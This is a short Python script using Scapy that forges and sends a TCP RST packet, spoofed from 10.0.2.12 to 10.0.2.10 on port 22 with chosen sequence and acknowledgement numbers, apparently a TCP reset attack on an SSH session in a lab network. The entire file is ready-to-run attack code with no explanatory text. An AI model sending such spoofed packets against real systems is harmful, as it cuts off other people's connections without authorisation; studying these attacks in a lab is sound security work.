#!/usr/bin/python3
from scapy.all import *

spoofed_packet = IP(
    src="10.0.2.12",
    dst="10.0.2.10",
) / TCP(
    sport=38426,
    dport=22,
    flags="R",
    seq=977382903,
    ack=1874445459,
)
spoofed_packet.show()
send(spoofed_packet)